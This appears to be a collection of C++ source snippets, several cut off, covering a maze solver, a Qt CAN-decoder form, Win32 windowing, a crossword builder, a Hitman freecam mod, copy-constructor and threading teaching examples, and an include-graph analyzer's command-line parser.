false;\n}\n\n// Function to solve the maze with flexible start and end characters\nstd::vector<Point> solveMaze(\n    const std::vector<std::string>& maze,\n    char wall,\n    char startChar,\n    char endChar\n) {\n    Point start = findPosition(maze, startChar);\n    Point end = findPosition(maze, endChar);\n\n    std::vector<Point> path;\n    std::vector<std::vector<bool>> seen(maze.size(), std::vector<bool>(maze[0].size(), false));\n\n    walk(maze, wall, start, end, seen, path);\n    return path;\n}\n\n// Function to draw the path on the maze\nstd::vector<std::string> drawPath(const std::vector<std::string>& maze, const std::vector<Point>& path) {\n    std::vector<std::string> result = maze;\n    for (const auto& p : path) {\n        result[p.second][p.first] = 'o';\n    }\n    return result;\n}\n\nint main() {\n    std::vector<std::string> maze = {\n        \"#S##################\",\n        \"#         ##########\",\n        \"#                  #\",\n        \"############ #######\",\n        \"#          # #   ###\",\n        \"# ########## #     #\",\n        \"#               ####\",\n        \"# ##################\",\n        \"                   #\",\n        \"############ #######\",\n        \"#              #####\",\n        \"#########E##########\",\n    };\n\n    // Solve the maze with custom start and end characters\n    std::vector<Point> result = solveMaze(maze, '#', 'S', 'E');\n\n    // Print the path coordinates\n    std::cout << \"Path coordinates:\\n\";\n    for (const auto& p : result) {\n        std::cout << \"(\" << p.first << \", \" << p.second << \")\\n\";\n    }\n\n    // Draw the path on the maze\n    std::vector<std::string> pathDrawnMaze = drawPath(maze, result);\n\n    // Print the maze with the path\n    std::cout << \"\\nMaze with path:\\n\";\n    for (const auto& row : pathDrawnMaze) {\n        std::cout << row << '\\n';\n    }\n\n    return 0;\n}\n\n\n//\n//#include <iostream>\n//#include <vector>\n//#include <utility>\n//#include <string>\n//#include <stdexcept>\n//\n//// Define a type alias for clarity\n//using Point = std::pair<int, int>;\n//\n//// Directions for movement in the maze\n//const std::vector<Point> dir = {\n//    {0, -1},  // Up\n//    {1, 0},   // Right\n//    {0, 1},   // Down\n//    {-1, 0}   // Left\n//};\n//\n//// Function to find the position of a target character in the maze\n//Point findPosition(const std::vector<std::string>& maze, char target) {\n//    for (size_t y = 0; y < maze.size(); ++y) {\n//        for (size_t x = 0; x < maze[y].length(); ++x) {\n//            if (maze[y][x] == target) {\n//                return { static_cast<int>(x), static_cast<int>(y) };\n//            }\n//        }\n//    }\n//    throw std::runtime_error(\"Target not found in maze\");\n//}\n//\n//// Recursive function to solve the maze\n//bool walk(\n//    const std::vector<std::string>& maze,\n//    char wall,\n//    Point curr,\n//    Point end,\n//    std::vector<std::vector<bool>>& seen,\n//    std::vector<Point>& path\n//) {\n//    // Check if current position is out of bounds, wall, or already visited\n//    if (curr.first < 0 || curr.first >= maze[0].size() ||\n//        curr.second < 0 || curr.second >= maze.size() ||\n//        maze[curr.second][curr.first] == wall ||\n//        seen[curr.",
    "/********************************************************************************\n** Form generated from reading UI file 'CAN_decode_UI.ui'\n**\n** Created by: Qt User Interface Compiler version 5.15.2\n**\n** WARNING! All changes made in this file will be lost when recompiling UI file!\n********************************************************************************/\n\n#ifndef UI_CAN_DECODE_UI_H\n#define UI_CAN_DECODE_UI_H\n\n#include <QtCore/QVariant>\n#include <QtWidgets/QApplication>\n#include <QtWidgets/QComboBox>\n#include <QtWidgets/QGridLayout>\n#include <QtWidgets/QGroupBox>\n#include <QtWidgets/QHBoxLayout>\n#include <QtWidgets/QLabel>\n#include <QtWidgets/QLineEdit>\n#include <QtWidgets/QPushButton>\n#include <QtWidgets/QSpacerItem>\n#include <QtWidgets/QSpinBox>\n#include <QtWidgets/QVBoxLayout>\n#include <QtWidgets/QWidget>\n\nQT_BEGIN_NAMESPACE\n\nclass Ui_Form\n{\npublic:\n    QVBoxLayout *verticalLayout;\n    QGroupBox *groupBox;\n    QGridLayout *gridLayout;\n    QHBoxLayout *horizontalLayout_5;\n    QLabel *label_4;\n    QComboBox *Value_Type;\n    QHBoxLayout *horizontalLayout;\n    QLabel *label;\n    QSpinBox *Start_Bit;\n    QHBoxLayout *horizontalLayout_2;\n    QLabel *label_2;\n    QSpinBox *Length;\n    QHBoxLayout *horizontalLayout_10;\n    QLabel *label_8;\n    QLineEdit *Resolution;\n    QHBoxLayout *horizontalLayout_4;\n    QLabel *label_3;\n    QComboBox *Byte_order;\n    QHBoxLayout *horizontalLayout_11;\n    QLabel *label_9;\n    QLineEdit *Offset;\n    QGroupBox *groupBox_2;\n    QHBoxLayout *horizontalLayout_14;\n    QHBoxLayout *horizontalLayout_12;\n    QLabel *label_10;\n    QLineEdit *Minimum;\n    QHBoxLayout *horizontalLayout_13;\n    QLabel *label_11;\n    QLineEdit *Maximum;\n    QGroupBox *groupBox_3;\n    QHBoxLayout *horizontalLayout_3;\n    QLineEdit *Data0;\n    QLineEdit *Data1;\n    QLineEdit *Data2;\n    QLineEdit *Data3;\n    QLineEdit *Data4;\n    QLineEdit *Data5;\n    QLineEdit *Data6;\n    QLineEdit *Data7;\n    QHBoxLayout *horizontalLayout_15;\n    QSpacerItem *horizontalSpacer;\n    QPushButton *Decode_Btn;\n    QSpacerItem *horizontalSpacer_2;\n    QGroupBox *groupBox_4;\n    QVBoxLayout *verticalLayout_2;\n    QLabel *Result;\n    QSpacerItem *verticalSpacer;\n\n    void setupUi(QWidget *Form)\n    {\n        if (Form->objectName().isEmpty())\n            Form->setObjectName(QString::fromUtf8(\"Form\"));\n        Form->resize(520, 450);\n        Form->setMinimumSize(QSize(500, 450));\n        Form->setMaximumSize(QSize(600, 550));\n        QFont font;\n        font.setFamily(QString::fromUtf8(\"Arial\"));\n        font.setPointSize(12);\n        Form->setFont(font);\n        verticalLayout = new QVBoxLayout(Form);\n        verticalLayout->setObjectName(QString::fromUtf8(\"verticalLayout\"));\n        groupBox = new QGroupBox(Form);\n        groupBox->setObjectName(QString::fromUtf8(\"groupBox\"));\n        gridLayout = new QGridLayout(groupBox);\n        gridLayout->setObjectName(QString::fromUtf8(\"gridLayout\"));\n        horizontalLayout_5 = new QHBoxLayout();\n        horizontalLayout_5->setObjectName(QString::fromUtf8(\"horizontalLayout_5\"));\n        label_4 = new QLabel(groupBox);\n        label_4->setObjectName(QString::fromUtf8(\"label_4\"));\n        label_4->setMinimumSize(QSize(100, 0));\n        label_4->setMaximumSize(QSize(100, 16777215));\n\n        horizontalLayout_5->addWidget(label_4);\n\n        Value_Type = new QComboBox(groupBox);\n        Value_Type->addItem(QString());\n        Value_Type->addItem(QString());\n        Value_Type->setObjectName(QString::fromUtf8(\"Value_Type\"));\n\n        horizontalLayout_5->addWidget(Value_Type);\n\n\n        gridLayout->addLayout(horizontalLayout_5, 1, 1, 1, 1);\n\n        horizontalLayout = new QHBoxLayout();\n        horizontalLayout->setObjectName(QString::fromUtf8(\"horizontalLayout\"));\n        label = new QLabel(groupBox);\n        label->setObjectName(QString::fromUtf8(\"label\"));\n        label->setMinimumSize(QSize(100, 0));\n        label->setMaximumSize(QSize(100, 16777215));\n\n        horizontalLayout->addWidget(label);\n\n        Start_Bit = new QSpinBox(groupBox);\n        Start_Bit->setObjectName(QString::fromUtf8(\"Start_Bit\"));\n        Start_Bit->setMaximum(63);\n\n        horizontalLayout->addWidget(Start_Bit);\n\n\n        gridLayout->addLayout(horizontalLayout, 0, 0, 1, 1);\n\n        horizontalLayout_2 = new QHBoxLayout();\n        horizontalLayout_2->setObjectName(QString::fromUtf8(\"horizontalLayout_2\"));\n        label_2 = new QLabel(groupBox);\n        label_2->setObjectName(QString::fromUtf8(\"label_2\"));\n        label_2->setMinimumSize(QSize(100, 0));\n        label_2->setMaximumSize(QSize(100, 16777215));\n\n        horizontalLayout_2->addWidget(label_2);\n\n        Length = new QSpinBox(groupBox);\n        Length->setObjectName(QString::fromUtf8(\"Length\"));\n        Length->setMaximum(64);\n\n        horizontalLayout_2->addWidget(Length);\n\n\n        gridLayout->addLayout(horizontalLayout_2, 0, 1, 1, 1);\n\n        horizontalLayout_10 = new QHBoxLayout();\n        horizontalLayout_10->setObjectName(QString::fromUtf8(\"hori",
    "#include \"Window.h\"\n#include \"resource.h\"\n\n\nWindow::WindowClass Window::WindowClass::wndClass;\n\nWindow::WindowClass::WindowClass() noexcept : hInst(GetModuleHandle(nullptr))\n{\n\n\tWNDCLASSEX wc = { 0 };\n\twc.cbSize = sizeof(wc);\n\twc.style = CS_OWNDC;\n\twc.lpfnWndProc = HandleMsgSetup;\n\twc.cbClsExtra = 0;\n\twc.cbWndExtra = 0;\n\twc.hInstance = GetInstance();\n\twc.hIcon = static_cast<HICON>(LoadImage(GetInstance(), MAKEINTRESOURCE(IDI_ICON1), IMAGE_ICON, 32, 32, 0));\n\twc.hCursor = nullptr;\n\twc.hbrBackground = nullptr;\n\twc.lpszMenuName = nullptr;\n\twc.lpszClassName = GetName();\n\twc.hIconSm = nullptr;\n\tRegisterClassEx(&wc);\n}\n\nWindow::WindowClass::~WindowClass() {\n\tUnregisterClass(wndClassName, GetInstance());\n}\n\nconst char* Window::WindowClass::GetName() noexcept\n{\n\treturn wndClassName;\n}\n\nHINSTANCE Window::WindowClass::GetInstance() noexcept\n{\n\treturn wndClass.hInst;\n}\n\nWindow::Window(int width, int height, const char* name) noexcept\n{\n\tDWORD window_option = WS_CAPTION | WS_MINIMIZEBOX | WS_SYSMENU;\n\n\n\n\thwnd = CreateWindowEx(0, WindowClass::GetName(), name, window_option, 100, 100, width, height, nullptr, nullptr, WindowClass::GetInstance(), nullptr);\n\n\tShowWindow(hwnd, SW_SHOW);\n\n}\nWindow::~Window()\n{\n\tDestroyWindow(hwnd);\n}\n\nLRESULT WINAPI Window::HandleMsgSetup(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) noexcept\n{\n\n\tif (msg == WM_NCCREATE) {\n\t\tconst CREATESTRUCTW* const pCreate = reinterpret_cast<CREATESTRUCTW*>(lParam);\n\t\tWindow* const pWnd = static_cast<Window*>(pCreate->lpCreateParams);\n\t\tSetWindowLongPtr(hwnd, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(pWnd));\n\t\tSetWindowLongPtr(hwnd, GWLP_WNDPROC, reinterpret_cast<LONG_PTR>(&Window::HandleMsgThunk));\n\n\t\treturn pWnd->HandleMsg(hwnd, msg, wParam, lParam);\n\t}\n\n\treturn DefWindowProc(hwnd, msg, wParam, lParam);\n}\n\n\n\n\nLRESULT WINAPI Window::HandleMsgThunk(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) noexcept\n{\n\tWindow* const pWnd = reinterpret_cast<Window*>(GetWindowLongPtr(hwnd, GWLP_USERDATA));\n\treturn pWnd->HandleMsg(hwnd, msg, wParam, lParam);\n}\n\n\n\nLRESULT Window::HandleMsg(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) noexcept\n{\n\n\tswitch (msg)\n\t{\n\tcase WM_CLOSE:\n\t\tPostQuitMessage(0);\n\t\treturn 0;\n\n\t}\n\n\treturn DefWindowProc(hwnd, msg, wParam, lParam);\n}",
    "#include <iostream>    // Include the library for input and output\r\n#include <vector>     // Include the library for using vectors (dynamic arrays)\r\n#include <string>     // Include the library for using string objects\r\n\r\nusing namespace std;  // Use the standard namespace to simplify code\r\n\r\n// Class definition for the Crossword puzzle\r\nclass Crossword {\r\nprivate:\r\n    vector<vector<char>> grid; // 2D vector to represent the crossword grid\r\n    int size;                  // Variable to store the size of the grid\r\n\r\npublic:\r\n    // Constructor to initialize the crossword grid with a given size\r\n    Crossword(int n) : size(n) {\r\n        // Resize the grid to size x size and fill with '.' (empty spaces)\r\n        grid.resize(size, vector<char>(size, '.'));\r\n    }\r\n\r\n    // Function to display the current state of the grid\r\n    void display() {\r\n        for (const auto& row : grid) {         // Iterate over each row in the grid\r\n            for (char cell : row) {             // Iterate over each cell in the row\r\n                cout << cell << ' ';            // Print the cell followed by a space\r\n            }\r\n            cout << endl;                        // Print a newline after each row\r\n        }\r\n    }\r\n\r\n    // Function to add a word to the grid\r\n    bool addWord(const string& word, int row, int col, bool horizontal) {\r\n        // Check if the word should be added horizontally\r\n        if (horizontal) {\r\n            // Check if the word fits within the grid boundaries\r\n            if (col + word.size() > size) return false; \r\n            \r\n            // Check for conflicts with existing letters in the grid\r\n            for (int i = 0; i < word.size(); ++i) {\r\n                // If there's a conflict, return false\r\n                if (grid[row][col + i] != '.' && grid[row][col + i] != word[i]) {\r\n                    return false; \r\n                }\r\n            }\r\n            // Place the word in the grid if no conflicts\r\n            for (int i = 0; i < word.size(); ++i) {\r\n                grid[row][col + i] = word[i]; // Insert each letter of the word\r\n            }\r\n        } else { // If the word is to be added vertically\r\n            // Check if the word fits within the grid boundaries\r\n            if (row + word.size() > size) return false; \r\n            \r\n            // Check for conflicts with existing letters in the grid\r\n            for (int i = 0; i < word.size(); ++i) {\r\n                // If there's a conflict, return false\r\n                if (grid[row + i][col] != '.' && grid[row + i][col] != word[i]) {\r\n                    return false; \r\n                }\r\n            }\r\n            // Place the word in the grid if no conflicts\r\n            for (int i = 0; i < word.size(); ++i) {\r\n                grid[row + i][col] = word[i]; // Insert each letter of the word\r\n            }\r\n        }\r\n        return true; // Return true if the word was added successfully\r\n    }\r\n};\r\n\r\n// Main function\r\nint main() {\r\n    int gridSize; // Variable to store the size of the grid\r\n    cout << \"Enter the size of the crossword grid: \"; // Prompt user for grid size\r\n    cin >> gridSize; // Read user input\r\n\r\n    // Create a Crossword object with the specified size\r\n    Crossword crossword(gridSize);\r\n    \r\n    crossword.display(); // Display the initial empty grid\r\n\r\n    string word; // Variable to store the user's word\r\n    int row, col; // Variables to store the starting position (row and column)\r\n    char direction; // Variable to store the direction of the word\r\n\r\n    // Loop to continuously allow user input\r\n    while (true) {\r\n        cout << \"Enter a word to add (or 'exit' to quit): \"; // Prompt for a word\r\n        cin >> word; // Read the word from user\r\n        if (word == \"exit\") break; // Exit if the user types \"exit\"\r\n\r\n        cout << \"Enter row and column (0-based): \"; // Prompt for position\r\n        cin >> row >> col; // Read the position from user\r\n        cout << \"Enter direction (h for horizontal, v for vertical): \"; // Prompt for direction\r\n        cin >> direction; // Read the direction from user\r\n\r\n        // Determine if the direction is horizontal or vertical\r\n        bool horizontal = (direction == 'h');\r\n        \r\n        // Try to add the word to the grid and display success or failure message\r\n        if (crossword.addWord(word, row, col, horizontal)) {\r\n            cout << \"Word added successfully!\" << endl; // Success message\r\n        } else {\r\n            cout << \"Failed to add word. It may not fit or there may be conflicts.\" << endl; // Failure message\r\n        }\r\n\r\n        crossword.display(); // Display the updated grid\r\n    }\r\n\r\n    return 0; // Indicate that the program ended successfully\r\n}\r\n",
    "#include \"FreecamAnchor.h\"\n\n#include <random>\n\n#include \"Events.h\"\n#include \"Functions.h\"\n#include \"Logging.h\"\n\n#include <Glacier/ZActor.h>\n#include <Glacier/SGameUpdateEvent.h>\n#include <Glacier/ZObject.h>\n#include <Glacier/ZCameraEntity.h>\n#include <Glacier/ZApplicationEngineWin32.h>\n#include <Glacier/ZEngineAppCommon.h>\n#include <Glacier/ZFreeCamera.h>\n#include <Glacier/ZRender.h>\n#include <Glacier/ZGameLoopManager.h>\n#include <Glacier/ZHitman5.h>\n#include <Glacier/ZHM5InputManager.h>\n#include <Glacier/ZItem.h>\n#include <Glacier/ZInputActionManager.h>\n\n#include \"IconsMaterialDesign.h\"\n\nFreecamAnchor::FreecamAnchor() :\n\tm_FreeCamActive(false),\n\tm_ShouldToggle(false),\n\tm_FreeCamFrozen(false),\n\tm_ControlsVisible(false),\n\tm_DebugMenuActive(false),\n\tm_ToggleFreeCamAction(\"ToggleFreeCamera\"),\n    m_FreezeFreeCamActionGc(\"ActivateGameControl0\"),\n    m_FreezeFreeCamActionKb(\"KBMInspectNode\"),\n\tm_AnchoredObjectAction(\"ToggleFollowObject\"),\n\tm_IncreaseXOffset(\"IncreaseXOffset\"),\n\tm_DecreaseXOffset(\"DecreaseXOffset\"),\n\tm_IncreaseYOffset(\"IncreaseYOffset\"),\n\tm_DecreaseYOffset(\"DecreaseYOffset\"),\n\tm_IncreaseZOffset(\"IncreaseZOffset\"),\n\tm_DecreaseZOffset(\"DecreaseZOffset\"),\n\tm_ResetOffset(\"ResetOffset\"),\n\tm_IncreaseOffsetStep(\"IncreaseOffsetStep\"),\n\tm_DecreaseOffsetStep(\"DecreaseOffsetStep\"),\n\tm_OffsetStep(0.5),\n\tm_Unanchor(\"Unanchor\")\n{\n    m_PcControls = {\n        { \"K\", \"Toggle freecam\" },\n        { \"F3\", \"Lock camera and enable 47 input\" },\n        { \"Ctrl + W/S\", \"Change FOV\" },\n        { \"Ctrl + A/D\", \"Roll camera\" },\n\t    { \"Ctrl + X\", \"Reset roll\" },\n        { \"Alt + W/S\", \"Change camera speed\" },\n        { \"Space + Q/E\", \"Change camera height\" },\n        { \"Space + W/S\", \"Move camera on axis\" },\n        { \"Shift\", \"Increase camera speed\" },\n        { \"Ctrl + F9\", \"Follow Object\" },\n    \t{ \"Shift + (8,9,0)\", \"Add to offset on (x,y,z) axis\"},\n    \t{ \"Ctrl + (8,9,0)\", \"Subtract to offset on (x,y,z) axis\"},\n\t\t{ \"l\", \"Unanchor from object (does not close freecam)\" },\n\t\t{ \";\", \"Reset Offset\"},\n    \t{ \"[\", \"Decrease offset step\"},\n    \t{ \"]\", \"Increase offset step\"},\n    };\n}\n\nFreecamAnchor::~FreecamAnchor()\n{\n    const ZMemberDelegate<FreecamAnchor, void(const SGameUpdateEvent&)> s_Delegate(this, &FreecamAnchor::OnFrameUpdate);\n    Globals::GameLoopManager->UnregisterFrameUpdate(s_Delegate, 1, EUpdateMode::eUpdatePlayMode);\n\n    // Reset the camera to default when unloading with freecam active.\n    if (m_FreeCamActive)\n    {\n        TEntityRef<IRenderDestinationEntity> s_RenderDest;\n        Functions::ZCameraManager_GetActiveRenderDestinationEntity->Call(Globals::CameraManager, &s_RenderDest);\n\n        s_RenderDest.m_pInterfaceRef->SetSource(&m_OriginalCam);\n\n        // Enable Hitman input.\n        TEntityRef<ZHitman5> s_LocalHitman;\n        Functions::ZPlayerRegistry_GetLocalPlayer->Call(Globals::PlayerRegistry, &s_LocalHitman);\n\n        if (s_LocalHitman)\n        {\n            auto* s_InputControl = Functions::ZHM5InputManager_GetInputControlForLocalPlayer->Call(Globals::InputManager);\n\n            if (s_InputControl)\n            {\n                Logger::Debug(\"Got local hitman entity and input control! Enabling input. {} {}\", fmt::ptr(s_InputControl), fmt::ptr(s_LocalHitman.m_pInterfaceRef));\n                s_InputControl->m_bActive = true;\n            }\n        }\n    }\n}\n\nvoid FreecamAnchor::Init()\n{\n    Hooks::ZInputAction_Digital->AddDetour(this, &FreecamAnchor::ZInputAction_Digital);\n    Hooks::ZEntitySceneContext_LoadScene->AddDetour(this, &FreecamAnchor::OnLoadScene);\n    Hooks::ZEntitySceneContext_ClearScene->AddDetour(this, &FreecamAnchor::OnClearScene);\n}\n\nvoid FreecamAnchor::OnEngineInitialized()\n{\n\tconst ZMemberDelegate<FreecamAnchor, void(const SGameUpdateEvent&)> s_Delegate(this, &FreecamAnchor::OnFrameUpdate);\n\tGlobals::GameLoopManager->RegisterFrameUpdate(s_Delegate, 1, EUpdateMode::eUpdatePlayMode);\n\n\tconst char* binds = \"FreeCameraInput={\"\n\t\t\"ToggleFreeCamera=tap(kb,k);\"\n\t\t\"ToggleFollowObject=& | hold(kb,lctrl) hold(kb,rctrl) tap(kb,f9);\"\n\t\t\"IncreaseXOffset=& | hold(kb,lshift) hold(kb,rshift) tap(kb,8);\"\n\t\t\"DecreaseXOffset=& | hold(kb,lctrl) hold(kb,rctrl) tap(kb,8);\"\n\t\t\"IncreaseYOffset=& | hold(kb,lshift) hold(kb,rshift) tap(kb,9);\"\n\t\t\"DecreaseYOffset=& | hold(kb,lctrl) hold(kb,rctrl) tap(kb,9);\"\n\t\t\"IncreaseZOffset=& | hold(kb,lshift) hold(kb,rshift) tap(kb,0);\"\n\t\t\"DecreaseZOffset=& | hold(kb,lctrl) hold(kb,rctrl) tap(kb,0);\"\n\t\t\"ResetOffset=tap(kb,semicolon);\"\n\t\t\"IncreaseOffsetStep=tap(kb,rbracket);\"\n\t\t\"DecreaseOffsetStep=tap(kb,lbracket);\"\n\t\t\"Unanchor=tap(kb,l);\"\n\t\t\"};\";\n\n\tif (ZInputActionManager::AddBindings(binds))\n\t{\n\t\tLogger::Debug(\"Successfully added bindings.\");\n\t}\n\telse\n\t{\n\t\tLogger::Debug(\"Failed to add bindings.\");\n\t}\n}\n\nSVector3 CrossProduct(SVector3 a, SVector3 b) {\n\tSVector3 crossProduct;\n\tcrossProduct.x = (a.y * b.z) - (a.z * b.y);\n\tcrossProduct.y = (a.x * b.z) - (a.z * b.x);\n\tcrossProduct.z = (a.x * b.y) - (a.y * b.x);\n\treturn crossProduct;\n}\n\nSVector3 Normalize(SVector3 vec) {\n",
    "#include <iostream>\nusing namespace std;\n// Define a class named Book\n\n// Instructions:\n// 1. Define a class named Book with an integer data member 'id' and a pointer data member 'price'.\n// 2. Implement a default constructor that initializes 'id' to 0 and dynamically allocates memory for 'price', initializing it to 0.\n// 3. (Optional) Implement a shallow copy constructor that copies 'id' and the pointer to 'price' from another Book object.\n// 4. (Optional) Implement a deep copy constructor that allocates new memory for 'price' and copies the value from another Book object.\n// 5. In the main function, create an instance of the Book class named 'opp' to test the default constructor.\n// 6. Create another instance of the Book class named 'math', passing 'opp' to demonstrate shallow copy (if shallow copy constructor is implemented).\n// 7. Output the initial values of 'opp' and 'math' to show that they share the same price pointer (shallow copy).\n// 8. Modify the 'id' and 'price' of 'opp'.\n// 9. Output the updated values of 'opp' and 'math' to illustrate the effects of shallow copying.\n\nclass Book {\n\npublic:\n    int id;       // An integer variable to store the book ID\n    int *price;   // A pointer to an integer to store the book price (dynamically allocated)\n\n    // Default constructor\n    /*\n       Initializes the book ID to 0 and dynamically allocates memory for price, \n       setting the price to 0. \n    */\n    Book() {\n        id = 0;\n        price = new int(0);  // Allocate memory for price and set it to 0\n    }\n\n    // Default shallow copy constructor (commented out)\n    /*\n       Copies the ID and the pointer to the price from the original object.\n       This creates a shallow copy, meaning both objects share the same price pointer.\n       Uncommenting this constructor would demonstrate shallow copying behavior.\n    */\n    // Book(const Book& book) {\n    //     this->id = book.id;\n    //     this->price = book.price;  // Both objects point to the same memory location for price\n    // }\n\n    // Deep copy constructor (commented out)\n    /*\n       Copies the ID and allocates new memory for price in the new object, \n       then copies the value stored at the original object's price pointer.\n       This creates a deep copy, meaning each object has its own price pointer.\n    */\n    // Book(const Book &book) {\n    //     this->id = book.id;       // Copy the ID\n    //     this->price = new int;     // Allocate new memory for price\n    //     *this->price = *(book.price);  // Copy the value of price from the original object\n    // }\n};\n\nint main() {\n\n    // Create an instance of Book named opp (default constructor)\n    /*\n       opp is initialized with id = 0 and price = 0 using the default constructor.\n    */\n    Book opp;\n\n    // Create another Book instance named math using opp (default copy constructor)\n    /*\n       math is created as a shallow copy of opp (since the deep copy constructor is commented out).\n       Both opp and math share the same memory address for the price pointer.\n    */\n    Book math(opp);\n\n    // Print initial values of opp and math objects\n    /*\n       Before making any changes, display the id and price of both opp and math objects.\n       Expected: both objects have the same id and price (id = 0, price = 0).\n    */\n    cout << \"Values of book before changing\" << endl;\n    cout << \"value of opp.id = \" << opp.id << endl;\n    cout << \"value of opp.price = \" << *(opp.price) << endl;\n\n    cout << \"value of math.id = \" << math.id << endl;\n    cout << \"value of math.price = \" << *(math.price) << endl;\n\n    // Modify the values of the opp object\n    /*\n       Change the id of opp to 1 and the price to 10.\n       Since opp and math share the same memory location for price (shallow copy),\n       this will affect the math object's price as well.\n    */\n    opp.id = 1;\n    *(opp.price) = 10;\n\n    // Print updated values of opp and math objects after modifying opp\n    /*\n       After changing opp, the id of opp should be 1 and the price should be 10.\n       However, since math shares the same memory address for price, its price will also change to 10.\n       Expected: math.id remains 0, but math.price becomes 10 due to shallow copy behavior.\n    */\n    cout << \"Values of book after changing\" << endl;\n    cout << \"value of opp.id = \" << opp.id << endl;  // Should print 1\n    cout << \"value of opp.price = \" << *(opp.price) << endl;  // Should print 10\n\n    cout << \"value of math.id = \" << math.id << endl;  // Should print 0\n    cout << \"value of math.price = \" << *(math.price) << endl;  // Should print 10 (unexpected due to shallow copy)\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <csignal>\n#include <unistd.h>\n\nusing namespace std;\n\nvoid custom_handler(int signal){\n    cout << \"SIGINT cant be handled as usual, its custom bro\\n\";\n}\n\nint main() {\n    signal(SIGINT, custom_handler);\n    while(1) {\n        cout << \"Running..\\n\";\n        sleep(1);\n    }\n}\n// C program to show thread functions \n\n#include <pthread.h> \n#include <stdio.h> \n#include <stdlib.h> \n\nvoid* func(void* arg) \n{ \n\t// detach the current thread \n\t// from the calling thread \n\tpthread_detach(pthread_self()); \n\n\tprintf(\"Inside the thread\\n\"); \n\n\t// exit the current thread \n\tpthread_exit(NULL); \n} \n\nvoid fun() \n{ \n\tpthread_t ptid; \n\n\t// Creating a new thread \n\tpthread_create(&ptid, NULL, &func, NULL); \n\tprintf(\"This line may be printed\"\n\t\t\" before thread terminates\\n\"); \n\n\t// The following line terminates \n\t// the thread manually \n\t// pthread_cancel(ptid); \n\n\t// Compare the two threads created \n\tif(pthread_equal(ptid, pthread_self())) \n\t\tprintf(\"Threads are equal\\n\"); \n\telse\n\t\tprintf(\"Threads are not equal\\n\"); \n\n\t// Waiting for the created thread to terminate \n\tpthread_join(ptid, NULL); \n\n\tprintf(\"This line will be printed\"\n\t\t\" after thread ends\\n\"); \n\n\tpthread_exit(NULL); \n} \n\n// Driver code \nint main() \n{ \n\tfun(); \n\treturn 0; \n} \n\n#include <iostream>\n#include <pthread.h>\n#include <semaphore.h>\n#include <unistd.h>\n\nsem_t mutex;\n\nvoid* thread(void* arg)\n{\n    // Wait (P operation)\n    sem_wait(&mutex);\n    std::cout << \"\\nEntered..\" << std::endl;\n\n    // Critical section\n    sleep(4);\n\n    // Signal (V operation)\n    std::cout << \"\\nJust Exiting...\" << std::endl;\n    sem_post(&mutex);\n\n    return nullptr;\n}\n\nint main()\n{\n    // Initialize the semaphore with a value of 1\n    sem_init(&mutex, 0, 1);\n\n    pthread_t t1, t2;\n\n    // Create thread 1\n    pthread_create(&t1, nullptr, thread, nullptr);\n\n    // Delay to allow thread 1 to enter the critical section\n    sleep(2);\n\n    // Create thread 2\n    pthread_create(&t2, nullptr, thread, nullptr);\n\n    // Wait for threads to complete\n    pthread_join(t1, nullptr);\n    pthread_join(t2, nullptr);\n\n    // Destroy the semaphore\n    sem_destroy(&mutex);\n\n    return 0;\n}\n",
    "#include \"TerminalInterface.h\"\n#include <cstdio>\n#include <cstring>\n#include <iostream>\n#include <filesystem>\n#include <cassert>\n#include \"graph/IncludeGraph.h\"\n#include \"analyzer/IncludeAnalyzer.h\"\n#include <chrono>\n#include \"utils.h\"\n\n#include \"output/TerminalStrategy.h\"\n#include \"output/DotStrategy.h\"\n#include \"analyzer/CircularInclusionAnalyzer.h\"\n\nusing source_graph::TerminalInterface;\nusing namespace std::chrono;\nusing namespace std::filesystem;\n\nstatic constexpr bool hasArg(char** argv, int idx, int totalLen)\n{\n    return (idx + 1 < totalLen && argv[idx + 1][0] != '-');\n}\n\nstatic inline void printArgRequirment(const char* arg)\n{\n    printf(\"%s requires an argument\\n\", arg);\n}\n\nconstexpr bool hasFlag(unsigned int value, unsigned int flag)\n{\n    return (value & flag) == flag;\n}\n\n\n#define CHECK_ARG(arg, argv, idx, totalLen) \\\n{\\\n    if (!hasArg(argv, idx, totalLen))\\\n    {\\\n        printArgRequirment(arg);\\\n        return false;\\\n    }\\\n}\n\n\n\nstatic void printHelp()\n{\n    printf(\n        \"Source Graph - Physical Depdency Analyzer v0.1\\n\"\n        \"Usage: ./source-graph <dir> <options>\\n\"\n        \"OPTIONS\\n\"\n        \" -d <dir>                  Source Code Directory\\n\"\n        \" -e, --ext <e1,e2,...,eN>  File extensions to scan, default: cpp,c,h,hpp\\n\"\n        \"ANALYSIS OPTIONS\\n\"\n        \" -f <files>                Target Files to analyze\\n\"\n        \"                           These should be relative to <dir>\\n\"\n        \" -o, --output <type>       Output Type\\n\"\n        \" Supported Output\\n\"\n        \"  stdout (default)         Print to screen\\n\"\n        \"  dot                      Output to graphviz-compat. DOT lang. file\\n\"\n        \"                           Analyzers below that support DOT are marked with a '*'\\n\"\n        \" -a <analyzer>             Analyzer to run\\n\"\n        \" Supported Analyzers:\\n\"\n        \"  *forward                 List Files include by <files> above\\n\"\n        \"  *reverse                 List Files that include any of the <files> above\\n\"\n        \"  *circle                  Circular Inclusion Detection\\n\"\n        \"  *icircle                 Indirect Inclusion Detection\\n\"\n        \"  bacon-num | transient    Same as above, but simply prints a number\\n\"\n    );\n\n\n}\n\nbool TerminalInterface::parse()\n{\n    if (m_argc == 1)\n    {\n        printHelp();\n        return false;\n    }\n\n    return parseArgs();\n}\n\n\nbool TerminalInterface::run()\n{\n    if (m_sourceList.getNumFiles() == 0 || m_analyzers == 0)\n    {\n        std::cerr << \"Need at least one directory and one analyzer.\\n\";\n        return false;\n    }\n    IncludeAnalyzer ia(m_sourceList, m_igraph);\n    time_point<steady_clock> start{ steady_clock::now() };\n    if (ia.analyze() != 0)\n    {\n        std::cerr << \"Failed to analyze!\\n\";\n        return false;\n    }\n    auto time = duration_cast<milliseconds>(steady_clock::now() - start).count();\n    std::cerr << \"Analyzed \" << ia.getNumFilesAnalyzed() \n              << \" files (\"<<ia.getLinesCounted()<<\" lines) in \"\n              <<time/1000.0f<<\"s\\n\";\n\n    return runAnalyzer();\n}\n\n\n\n\n\n\n\nbool TerminalInterface::parseArgs()\n{\n    for (int i = 1; i < m_argc; i++)\n    {\n        if (strcmp(m_argv[i], \"-d\") == 0)\n        {\n            CHECK_ARG(\"-d\", m_argv, i, m_argc);\n            